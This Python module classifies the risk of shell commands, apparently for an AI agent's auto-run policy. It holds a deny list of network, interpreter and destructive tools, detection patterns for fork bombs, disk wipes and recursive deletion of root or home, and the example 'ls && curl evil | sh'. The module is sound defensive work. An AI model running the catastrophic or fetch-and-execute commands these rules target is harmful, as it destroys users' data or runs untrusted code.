"""Shell-command risk classification.

The old rule looked only at the first word, so ``ls && curl evil | sh`` counted as a
harmless ``ls`` and ran without asking. Now a command is LOW (auto-run) only when it is a
*single, simple, read-only* command: no pipes, chaining, redirection, substitution or
newlines, a read-only program, and no dangerous flags. Anything that downloads, uploads,
runs an interpreter, escalates privileges or deletes is HIGH; the rest is MEDIUM.

Catastrophic commands (wiping ``/`` or home, formatting disks, fork bombs) are detected
separately by :func:`is_catastrophic` and become CRITICAL (denied by default policy).
"""

from __future__ import annotations

import re
import shlex

# Shell syntax that chains, pipes, redirects, substitutes or backgrounds.
_META = re.compile(r"[|;&`<>\n\r]|\$\(|\$\{")

READ_ONLY = {
    # POSIX
    "ls", "cat", "pwd", "echo", "whoami", "date", "df", "du", "ps", "grep", "egrep", "fgrep",
    "find", "which", "head", "tail", "wc", "file", "stat", "uname", "uptime", "free", "id",
    "hostname", "env", "printenv", "tree",
    # Windows
    "dir", "type", "where", "cd", "ver", "tasklist",
}

# Programs that reach the network, run arbitrary code, or escalate privileges.
DANGEROUS = {
    "curl", "wget", "nc", "ncat", "netcat", "ssh", "scp", "sftp", "rsync", "ftp", "tftp",
    "telnet", "socat", "invoke-webrequest", "iwr", "invoke-restmethod", "irm", "bitsadmin",
    "certutil", "sh", "bash", "zsh", "dash", "ksh", "fish", "cmd", "powershell", "pwsh",
    "python", "python3", "py", "perl", "ruby", "node", "deno", "php", "lua", "osascript",
    "eval", "exec", "xargs", "sudo", "su", "doas", "runas", "crontab", "at", "schtasks",
    # destructive / state-changing
    "rm", "rmdir", "mv", "dd", "mkfs", "shutdown", "reboot", "halt", "poweroff", "kill",
    "pkill", "killall", "chmod", "chown", "chattr", "truncate", "shred", "wipefs", "fdisk",
    "parted", "mount", "umount", "del", "erase", "format", "rd", "diskpart", "reg",
    "systemctl", "service", "iptables", "ufw", "useradd", "userdel", "passwd",
}

# Flags that turn an otherwise read-only program into a writer or code runner.
_DANGEROUS_FLAGS = {
    "find": {"-exec", "-execdir", "-ok", "-okdir", "-delete", "-fprint", "-fprint0",
             "-fprintf", "-fls"},
}


def _program(token: str) -> str:
    """Normalise ``/usr/bin/Curl.exe`` → ``curl``."""
    name = token.replace("\\", "/").rsplit("/", 1)[-1].lower()
    for ext in (".exe", ".cmd", ".bat", ".ps1"):
        if name.endswith(ext):
            return name[: -len(ext)]
    return name


def _tokens(cmd: str) -> list[str] | None:
    try:
        return shlex.split(cmd, posix=True)
    except ValueError:  # unbalanced quotes etc. — can't reason about it
        return None


_ASSIGN = re.compile(r"^[A-Za-z_][A-Za-z0-9_]*=")


# Wrappers that run another program: look through them to the real one.
_WRAPPERS = {"env", "nohup", "time", "nice", "command", "stdbuf", "timeout", "ionice"}


def _segments(cmd: str) -> list[list[str]]:
    """Token lists for each pipeline/chain/substitution segment, wrappers stripped."""
    out: list[list[str]] = []
    for seg in re.split(r"\|\||&&|[|;&\n\r`]|\$\(", cmd):
        seg = seg.strip().lstrip("({").strip()
        if not seg:
            continue
        toks = _tokens(seg) or seg.split()
        while toks and (_ASSIGN.match(toks[0]) or _program(toks[0]) in _WRAPPERS
                        or toks[0].startswith("-") or toks[0].replace(".", "").isdigit()):
            if _program(toks[0]) in _WRAPPERS and len(toks) == 1:
                break  # bare `env` / `time`: that's the program itself
            toks = toks[1:]
        if toks:
            out.append(toks)
    return out


def command_programs(cmd: str) -> list[str]:
    """The program names a command line would execute (first word of each segment)."""
    return [_program(t[0]) for t in _segments(cmd)]


def classify_command(command: str) -> str:
    """Return ``"low"``, ``"medium"`` or ``"high"`` for a shell command."""
    cmd = (command or "").strip()
    if not cmd:
        return "medium"
    # A dangerous program in *command position* of any segment → HIGH, so the part
    # after a pipe/chain/substitution counts too (`ls | curl x`, `a; rm b`, `$(wget ..)`).
    segments = _segments(cmd)
    if any(_program(t[0]) in DANGEROUS for t in segments):
        return "high"
    for toks in segments:  # e.g. `find . -exec ...` / `find / -delete`, even when chained
        if any(t in _DANGEROUS_FLAGS.get(_program(toks[0]), ()) for t in toks[1:]):
            return "high"
    if _META.search(cmd):
        return "medium"
    tokens = _tokens(cmd)
    if not tokens:
        return "medium"
    prog = _program(tokens[0])
    if prog not in READ_ONLY:
        return "medium"
    if prog == "env" and len(tokens) > 1:
        return "medium"  # `env FOO=1 prog` runs prog
    return "low"


# ── catastrophic commands (always CRITICAL) ──────────────────────────────────────────
_WIPE_TARGETS = {"/", "/*", "~", "~/", "~/*", "$home", "${home}", "*", "/home", "/root",
                 "/etc", "/usr", "/var", "/boot", "c:\\", "c:/"}


def _rm_wipes(tokens: list[str]) -> bool:
    """`rm` with recursive+force (any flag spelling) aimed at a root/home/glob target."""
    recursive = force = False
    targets: list[str] = []
    for t in tokens[1:]:
        tl = t.lower()
        if tl in ("--recursive",):
            recursive = True
        elif tl == "--force":
            force = True
        elif tl.startswith("--"):
            continue
        elif tl.startswith("-") and len(tl) > 1:
            recursive |= "r" in tl[1:]
            force |= "f" in tl[1:]
        else:
            targets.append(tl.rstrip("/") or "/")
    del force  # `rm -r /` is just as destructive without -f
    return recursive and any(t in _WIPE_TARGETS or t.rstrip("/*") in ("", "~") for t in targets)


_CATASTROPHIC_RE = [
    re.compile(r"\bmkfs(\.\w+)?\b", re.I),
    re.compile(r":\(\)\s*\{.*\}\s*;\s*:", re.S),               # fork bomb
    re.compile(r"\bdd\b[^\n]*\bof=/dev/(sd|nvme|hd|xvd|vd|disk|mmcblk)", re.I),
    re.compile(r">\s*/dev/(sd|nvme|hd|xvd|vd|disk|mmcblk)", re.I),
    re.compile(r"\bshutil\.rmtree\(\s*['\"](/|~|[a-z]:\\\\?)['\"]", re.I),
    re.compile(r"\bshutil\.rmtree\(\s*(os\.path\.expanduser\(\s*['\"]~['\"]\s*\)|"
               r"pathlib\.path\.home\(\)|path\.home\(\))", re.I),
    re.compile(r"\bchmod\s+(-[a-z]*r[a-z]*\s+)+[0-7]{3,4}\s+/(\s|$)", re.I),
    re.compile(r"\bformat\s+[a-z]:", re.I),
    re.compile(r"\b(del|erase)\s+(/[a-z]\s+)*[a-z]:\\\\?\*?", re.I),
    re.compile(r"\b(rd|rmdir)\s+/s\b", re.I),
    re.compile(r"\bdiskpart\b", re.I),
]


def is_catastrophic(text: str) -> bool:
    """True for commands/code that would wipe the system or the user's home."""
    if not text:
        return False
    if any(rx.search(text) for rx in _CATASTROPHIC_RE):
        return True
    # Check every `rm` invocation in a chained/piped command.
    for segment in re.split(r"[;&|\n]+", text):
        tokens = _tokens(segment.strip())
        if not tokens:
            continue
        # skip `sudo`, `env X=1`, etc. in front of rm
        while tokens and (_program(tokens[0]) in {"sudo", "doas", "env", "nohup", "command"}
                          or "=" in tokens[0]):
            tokens = tokens[1:]
        if tokens and _program(tokens[0]) == "rm" and _rm_wipes(tokens):
            return True
    return False
